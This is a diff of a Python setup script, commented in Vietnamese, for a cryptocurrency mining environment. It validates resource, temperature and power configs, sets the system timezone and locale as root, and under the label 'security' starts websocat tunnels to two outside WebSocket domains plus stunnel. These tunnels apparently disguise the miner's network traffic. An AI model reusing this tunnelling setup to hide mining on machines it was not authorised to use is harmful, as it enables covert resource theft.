@@ -5,11 +5,12 @@ import sys
 import json
 import subprocess
 import locale
-import psutil  # Thêm psutil để giám sát tài nguyên
+import psutil
 from pathlib import Path
 
 # Import cấu hình logging chung
 from .logging_config import setup_logging
+
 
 def load_json_config(config_path, logger):
     """
@@ -19,6 +20,10 @@ def load_json_config(config_path, logger):
         with open(config_path, 'r') as file:
             config = json.load(file)
         logger.info(f"Đã tải cấu hình từ {config_path}")
+        # [CHANGES] Kiểm tra config có đúng kiểu dict không
+        if not isinstance(config, dict):
+            logger.error(f"Nội dung JSON trong {config_path} không phải dict. Dừng.")
+            sys.exit(1)
         return config
     except FileNotFoundError:
         logger.error(f"Tệp cấu hình không tồn tại: {config_path}")
@@ -27,19 +32,18 @@ def load_json_config(config_path, logger):
         logger.error(f"Lỗi cú pháp JSON trong tệp {config_path}: {e}")
         sys.exit(1)
 
+
 def configure_system(system_params, logger):
     """
     Thiết lập các tham số hệ thống như múi giờ và locale.
     """
     try:
-        # Thiết lập múi giờ
         timezone = system_params.get('timezone', 'UTC')
         os.environ['TZ'] = timezone
         subprocess.run(['ln', '-snf', f'/usr/share/zoneinfo/{timezone}', '/etc/localtime'], check=True)
         subprocess.run(['dpkg-reconfigure', '-f', 'noninteractive', 'tzdata'], check=True)
         logger.info(f"Múi giờ hệ thống được thiết lập thành: {timezone}")
 
-        # Thiết lập locale
         locale_setting = system_params.get('locale', 'en_US.UTF-8')
         try:
             locale.setlocale(locale.LC_ALL, locale_setting)
@@ -49,7 +53,7 @@ def configure_system(system_params, logger):
             subprocess.run(['locale-gen', locale_setting], check=True)
             locale.setlocale(locale.LC_ALL, locale_setting)
             logger.info(f"Locale hệ thống được thiết lập thành: {locale_setting}")
-        
+
         subprocess.run(['update-locale', f'LANG={locale_setting}'], check=True)
         logger.info(f"Locale hệ thống được cập nhật thành: {locale_setting}")
     except subprocess.CalledProcessError as e:
@@ -59,34 +63,34 @@ def configure_system(system_params, logger):
         logger.error(f"Lỗi khi thiết lập locale: {e}")
         sys.exit(1)
 
+
 def setup_environment_variables(environmental_limits, logger):
     """
     Đặt các biến môi trường dựa trên các giới hạn môi trường.
     """
     try:
-        # Xử lý memory_limits
+        # memory_limits
         memory_limits = environmental_limits.get('memory_limits', {})
         ram_percent_threshold = memory_limits.get('ram_percent_threshold')
         if ram_percent_threshold is not None:
             os.environ['RAM_PERCENT_THRESHOLD'] = str(ram_percent_threshold)
             logger.info(f"Đã đặt biến môi trường RAM_PERCENT_THRESHOLD: {ram_percent_threshold}%")
         else:
-            # Xóa biến môi trường nếu không có giá trị trong config
             if 'RAM_PERCENT_THRESHOLD' in os.environ:
                 del os.environ['RAM_PERCENT_THRESHOLD']
                 logger.info("Đã xóa biến môi trường RAM_PERCENT_THRESHOLD vì không có trong cấu hình.")
             logger.warning("Không tìm thấy `ram_percent_threshold` trong `memory_limits`.")
 
-        # Xử lý gpu_optimization
+        # gpu_optimization
         gpu_optimization = environmental_limits.get('gpu_optimization', {})
-        gpu_util_min = gpu_optimization.get('gpu_utilization_percent_optimal', {}).get('min')
-        gpu_util_max = gpu_optimization.get('gpu_utilization_percent_optimal', {}).get('max')
+        gpu_util = gpu_optimization.get('gpu_utilization_percent_optimal', {})
+        gpu_util_min = gpu_util.get('min')
+        gpu_util_max = gpu_util.get('max')
         if gpu_util_min is not None and gpu_util_max is not None:
             os.environ['GPU_UTIL_MIN'] = str(gpu_util_min)
             os.environ['GPU_UTIL_MAX'] = str(gpu_util_max)
             logger.info(f"Đã đặt biến môi trường GPU_UTIL_MIN: {gpu_util_min}%, GPU_UTIL_MAX: {gpu_util_max}%")
         else:
-            # Tùy chọn: Xóa các biến môi trường GPU nếu không cần thiết
             if 'GPU_UTIL_MIN' in os.environ:
                 del os.environ['GPU_UTIL_MIN']
                 logger.info("Đã xóa biến môi trường GPU_UTIL_MIN vì không có trong cấu hình.")
@@ -98,21 +102,17 @@ def setup_environment_variables(environmental_limits, logger):
         logger.error(f"Lỗi khi đặt biến môi trường: {e}")
         sys.exit(1)
 
+
 def configure_security(logger):
     """
     Khởi chạy hai tiến trình Websocat và Stunnel để phục vụ kết nối/bảo mật.
     """
-    # Lệnh để khởi chạy websocat thứ nhất (cổng 5555)
     websocat_command_1 = "websocat -v --binary tcp-l:127.0.0.1:5555 wss://massiveinfinity.online/ws"
-    # Lệnh để khởi chạy websocat thứ hai (cổng 5556)
     websocat_command_2 = "websocat -v --binary tcp-l:127.0.0.1:5556 wss://strainingmodules.tech/ws"
-
     stunnel_conf_path = '/etc/stunnel/stunnel.conf'
 
     logger.info("Bắt đầu thiết lập bảo mật (Websocat & Stunnel).")
-
     try:
-        # ---- Khởi chạy websocat thứ nhất ----
         logger.info("Đang khởi chạy Websocat trên cổng 5555...")
         websocat_process_1 = subprocess.Popen(
             websocat_command_1,
@@ -123,7 +123,6 @@ def configure_security(logger):
         )
         logger.info(f"Websocat (5555) đã được khởi chạy, PID = {websocat_process_1.pid}.")
 
-        # ---- Khởi chạy websocat thứ hai ----
         logger.info("Đang khởi chạy Websocat trên cổng 5556...")
         websocat_process_2 = subprocess.Popen(
             websocat_command_2,
@@ -134,16 +133,13 @@ def configure_security(logger):
         )
         logger.info(f"Websocat (5556) đã được khởi chạy, PID = {websocat_process_2.pid}.")
 
-        # ---- Kiểm tra file cấu hình stunnel ----
         if not os.path.exists(stunnel_conf_path):
             logger.error(f"Tệp cấu hình stunnel không tồn tại: {stunnel_conf_path}")
             sys.exit(1)
 
-        # ---- Kiểm tra xem stunnel đã chạy hay chưa ----
         logger.info("Kiểm tra tiến trình Stunnel...")
         result = subprocess.run(['pgrep', '-f', 'stunnel'], stdout=subprocess.PIPE)
         if result.returncode != 0:
-            # Chưa chạy -> khởi chạy
             logger.info("Stunnel chưa chạy. Đang khởi chạy...")
             stunnel_process = subprocess.Popen(
                 ['stunnel', stunnel_conf_path],
@@ -162,11 +158,18 @@ def configure_security(logger):
         logger.error(f"Lỗi không mong muốn: {e}")
         sys.exit(1)
 
+
 def validate_configs(resource_config, system_params, environmental_limits, logger):
     """
     Kiểm tra tính hợp lệ của các tệp cấu hình.
+    (Chỉ so sánh giá trị trong dict, không so sánh dict < dict)
     """
     try:
+        # [CHANGES] Kiểm tra trước xem chúng có phải dict không
+        if not all(isinstance(cfg, dict) for cfg in (resource_config, system_params, environmental_limits)):
+            logger.error("resource_config, system_params, hoặc environmental_limits không phải dict.")
+            sys.exit(1)
+
         # 1. Kiểm Tra RAM
         ram_allocation = resource_config.get('resource_allocation', {}).get('ram', {})
         ram_max_mb = ram_allocation.get('max_allocation_mb')
@@ -215,7 +218,6 @@ def validate_configs(resource_config, system_params, environmental_limits, logge
             logger.info(f"Giới hạn GPU percent threshold: {gpu_percent_threshold}%")
 
         # 5. Kiểm Tra GPU Usage Percent Max
-        # => Đổi logic: thay vì usage_percent_range["max"], ta đọc max_usage_percent
         gpu_usage_max_percent = resource_config.get('resource_allocation', {}) \
                                               .get('gpu', {}) \
                                               .get('max_usage_percent')
@@ -276,7 +278,7 @@ def validate_configs(resource_config, system_params, environmental_limits, logge
         cpu_temperature = environmental_limits.get('temperature_limits', {}).get('cpu', {})
         cpu_max_celsius = cpu_temperature.get('max_celsius')
         if cpu_max_celsius is None:
-            logger.error("Thiếu `temperature_limits.cpu.max_celsius` trong `environmental_limits.temperature_limits`.")
+            logger.error("Thiếu `temperature_limits.cpu.max_celsius`.")
             sys.exit(1)
         if not (50 <= cpu_max_celsius <= 100):
             logger.error("Giá trị `temperature_limits.cpu.max_celsius` không hợp lệ. Phải từ 50°C đến 100°C.")
@@ -288,7 +290,7 @@ def validate_configs(resource_config, system_params, environmental_limits, logge
         gpu_temperature = environmental_limits.get('temperature_limits', {}).get('gpu', {})
         gpu_max_celsius = gpu_temperature.get('max_celsius')
         if gpu_max_celsius is None:
-            logger.error("Thiếu `temperature_limits.gpu.max_celsius` trong `environmental_limits.temperature_limits`.")
+            logger.error("Thiếu `temperature_limits.gpu.max_celsius`.")
             sys.exit(1)
         if not (40 <= gpu_max_celsius <= 100):
             logger.error("Giá trị `temperature_limits.gpu.max_celsius` không hợp lệ. Phải từ 40°C đến 100°C.")
@@ -296,11 +298,11 @@ def validate_configs(resource_config, system_params, environmental_limits, logge
         else:
             logger.info(f"Giới hạn nhiệt độ GPU: {gpu_max_celsius}°C")
 
-        # 12. Kiểm Tra Power Consumption
+        # 12. Kiểm Tra Power Consumption (Tổng)
         power_limits = environmental_limits.get('power_limits', {})
         total_power_max = power_limits.get('total_power_watts', {}).get('max')
         if total_power_max is None:
-            logger.error("Thiếu `power_limits.total_power_watts.max` trong `environmental_limits.power_limits.total_power_watts`.")
+            logger.error("Thiếu `power_limits.total_power_watts.max`.")
             sys.exit(1)
         if not (100 <= total_power_max <= 400):
             logger.error("Giá trị `power_limits.total_power_watts.max` không hợp lệ. Phải từ 100 W đến 300 W.")
@@ -308,105 +310,106 @@ def validate_configs(resource_config, system_params, environmental_limits, logge
         else:
             logger.info(f"Giới hạn tổng tiêu thụ năng lượng: {total_power_max} W")
 
+        # 13. CPU & GPU Device Power
         per_device_power_watts = power_limits.get('per_device_power_watts', {})
         per_device_power_cpu_max = per_device_power_watts.get('cpu', {}).get('max')
         if per_device_power_cpu_max is None:
-            logger.error("Thiếu `power_limits.per_device_power_watts.cpu.max` trong `environmental_limits.power_limits.per_device_power_watts.cpu`.")
+            logger.error("Thiếu `power_limits.per_device_power_watts.cpu.max`.")
             sys.exit(1)
         if not (50 <= per_device_power_cpu_max <= 150):
-            logger.error("Giá trị `power_limits.per_device_power_watts.cpu.max` không hợp lệ. Phải từ 50 W đến 150 W.")
+            logger.error("Giá trị `power_limits.per_device_power_watts.cpu.max` không hợp lệ. 50~150W.")
             sys.exit(1)
         else:
             logger.info(f"Giới hạn tiêu thụ năng lượng CPU: {per_device_power_cpu_max} W")
 
         per_device_power_gpu_max = per_device_power_watts.get('gpu', {}).get('max')
         if per_device_power_gpu_max is None:
-            logger.error("Thiếu `power_limits.per_device_power_watts.gpu.max` trong `environmental_limits.power_limits.per_device_power_watts.gpu`.")
+            logger.error("Thiếu `power_limits.per_device_power_watts.gpu.max`.")
             sys.exit(1)
         if not (50 <= per_device_power_gpu_max <= 200):
-            logger.error("Giá trị `power_limits.per_device_power_watts.gpu.max` không hợp lệ. Phải từ 50 W đến 150 W.")
+            logger.error("Giá trị `power_limits.per_device_power_watts.gpu.max` không hợp lệ. 50~200W.")
             sys.exit(1)
         else:
             logger.info(f"Giới hạn tiêu thụ năng lượng GPU: {per_device_power_gpu_max} W")
 
-        # 13. Kiểm Tra Memory Limits
+        # 14. Kiểm Tra Memory Limits
         memory_limits = environmental_limits.get('memory_limits', {})
         ram_percent_threshold = memory_limits.get('ram_percent_threshold')
         if ram_percent_threshold is None:
             logger.error("Thiếu `ram_percent_threshold` trong `environmental_limits.memory_limits`.")
             sys.exit(1)
         if not (50 <= ram_percent_threshold <= 100):
-            logger.error("Giá trị `ram_percent_threshold` không hợp lệ. Phải từ 50% đến 100%.")
+            logger.error("Giá trị `ram_percent_threshold` không hợp lệ. 50%~100%.")
             sys.exit(1)
         else:
             logger.info(f"Giới hạn RAM percent threshold: {ram_percent_threshold}%")
 
-        # 14. Kiểm Tra GPU Optimization
+        # 15. GPU Optimization
         gpu_optimization = environmental_limits.get('gpu_optimization', {})
-        gpu_util_min = gpu_optimization.get('gpu_utilization_percent_optimal', {}).get('min')
-        gpu_util_max = gpu_optimization.get('gpu_utilization_percent_optimal', {}).get('max')
+        gpu_util = gpu_optimization.get('gpu_utilization_percent_optimal', {})
+        gpu_util_min = gpu_util.get('min')
+        gpu_util_max = gpu_util.get('max')
         if gpu_util_min is None or gpu_util_max is None:
-            logger.error("Thiếu `gpu_utilization_percent_optimal.min` hoặc `gpu_utilization_percent_optimal.max` trong `environmental_limits.gpu_optimization`.")
+            logger.error("Thiếu `gpu_utilization_percent_optimal.min` hoặc `max` trong `environmental_limits.gpu_optimization`.")
             sys.exit(1)
         if not (0 <= gpu_util_min < gpu_util_max <= 100):
-            logger.error("Giá trị `gpu_utilization_percent_optimal.min` và `gpu_utilization_percent_optimal.max` không hợp lệ. Phải 0 <= min < max <= 100.")
+            logger.error("Giá trị GPU utilization (min, max) không hợp lệ. 0 <= min < max <= 100.")
             sys.exit(1)
         else:
-            logger.info(f"Giới hạn tối ưu hóa GPU utilization: min={gpu_util_min}%, max={gpu_util_max}%")
+            logger.info(f"Giới hạn tối ưu GPU utilization: min={gpu_util_min}%, max={gpu_util_max}%")
 
         logger.info("Các tệp cấu hình đã được xác thực đầy đủ.")
     except Exception as e:
         logger.error(f"Lỗi trong quá trình xác thực cấu hình: {e}")
         sys.exit(1)
 
+
 def setup_gpu_optimization(environmental_limits, logger):
     """
     Thiết lập tối ưu hóa GPU dựa trên ngưỡng sử dụng (placeholder).
     """
     logger.info("Thiết lập tối ưu hóa GPU dựa trên các ngưỡng đã cấu hình.")
-    # Implement thêm các bước cần thiết ở đây nếu có
+    # Placeholder nếu muốn thực thi thêm logic GPU
+
 
 def setup():
     """
     Hàm chính để thiết lập môi trường khai thác.
     """
-    # Định nghĩa đường dẫn tới các thư mục và tệp log
     CONFIG_DIR = os.getenv('CONFIG_DIR', '/app/mining_environment/config')
     LOGS_DIR = os.getenv('LOGS_DIR', '/app/mining_environment/logs')
     os.makedirs(LOGS_DIR, exist_ok=True)
 
-    # Thiết lập logging với logging_config.py
     logger = setup_logging('setup_env', Path(LOGS_DIR) / 'setup_env.log', 'INFO')
 
     logger.info("Bắt đầu thiết lập môi trường khai thác tiền điện tử.")
 
-    # Định nghĩa đường dẫn tới các tệp cấu hình
     system_params_path = os.path.join(CONFIG_DIR, 'system_params.json')
     environmental_limits_path = os.path.join(CONFIG_DIR, 'environmental_limits.json')
     resource_config_path = os.path.join(CONFIG_DIR, 'resource_config.json')
 
-    # Tải các tệp cấu hình
+    # Tải cấu hình
     system_params = load_json_config(system_params_path, logger)
     environmental_limits = load_json_config(environmental_limits_path, logger)
     resource_config = load_json_config(resource_config_path, logger)
 
-    # Xác thực cấu hình
+    # Xác thực
     validate_configs(resource_config, system_params, environmental_limits, logger)
 
-    # Đặt các biến môi trường dựa trên các giới hạn môi trường
+    # Đặt biến môi trường
     setup_environment_variables(environmental_limits, logger)
 
-    # Cấu hình hệ thống
+    # Cấu hình hệ thống (múi giờ, locale)
     configure_system(system_params, logger)
 
-    # Thiết lập tối ưu hóa GPU nếu cần
+    # Tối ưu hóa GPU
     setup_gpu_optimization(environmental_limits, logger)
 
-    # Cấu hình bảo mật (khởi chạy stunnel và websocat)
+    # Cấu hình bảo mật
     configure_security(logger)
 
-    # Các thiết lập bổ sung nếu cần
     logger.info("Môi trường khai thác đã được thiết lập hoàn chỉnh.")
+
 
 if __name__ == "__main__":
     # Đảm bảo script chạy với quyền root
